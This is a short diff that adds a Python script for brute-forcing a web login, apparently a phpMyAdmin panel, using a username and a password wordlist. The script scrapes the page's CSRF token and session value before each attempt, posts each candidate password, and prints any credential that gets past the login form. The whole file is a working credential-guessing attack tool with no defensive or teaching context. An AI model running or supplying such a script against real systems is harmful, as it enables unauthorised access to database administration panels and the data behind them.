@@ -1,0 +1,59 @@
+#file to brite force password on a webpage given page, wordlist, and username
+import requests
+from bs4 import BeautifulSoup
+
+URL = ""
+USERNAME = ""
+WORDLIST = ""
+
+session = requests.Session()
+
+def get_login_data():
+	"""Fetch CSRF token + set_session"""
+	r = session.get(URL)
+	soup = BeautifulSoup(r.text, "html.parser")
+
+	token = soup.find("input", {"name": "token"})
+	session_id = soup.find("input", {"name": "set_session"})
+
+	if not token or not session_id:
+    	print("[!] Missing token or session")
+    	return None, None
+
+	return token.get("value"), session_id.get("value")
+
+def attempt_login(password):
+	token, set_session = get_login_data()
+	if not token:
+    	return False
+
+	data = {
+    	"pma_username": USERNAME,
+    	"pma_password": password,
+    	"server": "1",
+    	"target": "index.php",
+    	"token": token,
+    	"set_session": set_session
+	}
+
+	r = session.post(URL, data=data)
+
+	# Debug (optional)
+	# print(len(r.text))
+
+	# Check if still on login page
+	if 'id="login_form"' in r.text:
+    	return False
+	else:
+    	return True
+
+# Brute force loop
+with open(WORDLIST, "r", encoding="latin-1") as f:
+	for line in f:
+    	password = line.strip()
+    	print(f"[*] Trying: {password}")
+
+    	if attempt_login(password):
+        	print(f"[+] SUCCESS: {USERNAME}:{password}")
+        	break
+
